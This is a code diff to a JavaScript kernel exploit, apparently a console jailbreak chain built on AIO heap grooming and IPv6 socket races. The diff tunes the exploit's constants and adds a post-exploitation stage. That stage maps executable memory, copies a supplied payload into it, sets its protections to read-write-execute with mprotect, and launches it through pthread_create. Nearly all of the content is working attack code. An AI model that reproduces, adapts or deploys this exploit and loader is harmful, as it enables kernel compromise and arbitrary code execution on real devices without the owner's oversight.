@@ -133,13 +133,14 @@ const main_core = 7;
 const num_grooms = 0x200;
 const num_handles = 0x100;
 const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
-const num_alias = 100;
+const num_alias = 50; //TODO: check best value here for 9.xx
 const num_races = 100;
 const leak_len = 16;
 const num_leaks = 5;
 const num_clobbers = 8;
 
 let chain = null;
+var nogc = [];
 async function init() {
     await rop.init();
     chain = new Chain();
@@ -1640,7 +1641,7 @@ function setup(block_fd) {
     const greqs = make_reqs1(num_reqs);
     // allocate enough so that we start allocating from a newly created slab
     spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
-    cancel_aios(groom_ids_p, num_grooms);        
+    cancel_aios(groom_ids_p, num_grooms);    
     return [block_id, groom_ids];
 }
 
@@ -1656,7 +1657,6 @@ function setup(block_fd) {
 //
 // the exploit implementation also assumes that we are pinned to one core
 export async function kexploit() {
- 
     const _init_t1 = performance.now();
     await init();
     const _init_t2 = performance.now();
@@ -1733,12 +1733,42 @@ export async function kexploit() {
     for (const sd of sds) {
         close(sd);
     }
-               
 }
 
-kexploit();
+kexploit().then(() => {
+    function malloc(sz) {
+        var backing = new Uint8Array(0x10000 + sz);
+        nogc.push(backing);
+        var ptr = mem.readp(mem.addrof(backing).add(0x10));
+        ptr.backing = backing;
+        return ptr;
+    }
 
+    function malloc32(sz) {
+        var backing = new Uint8Array(0x10000 + sz * 4);
+        nogc.push(backing);
+        var ptr = mem.readp(mem.addrof(backing).add(0x10));
+        ptr.backing = new Uint32Array(backing.buffer);
+        return ptr;
+    }
+    window.pld_size = new Int(0x26200000, 0x9);
 
-    
+    var payload_buffer = chain.sysp('mmap', window.pld_size, 0x300000, 7, 0x41000, -1, 0);
+    var payload = window.pld;
+    var bufLen = payload.length * 4
+    var payload_loader = malloc32(bufLen);
+    var loader_writer = payload_loader.backing;
+    for (var i = 0; i < payload.length; i++) {
+        loader_writer[i] = payload[i];
+    }
+    chain.sys('mprotect', payload_loader, bufLen, (0x1 | 0x2 | 0x4));
+    var pthread = malloc(0x10);
 
-
+    call_nze(
+        'pthread_create',
+        pthread,
+        0,
+        payload_loader,
+        payload_buffer,
+    );
+})
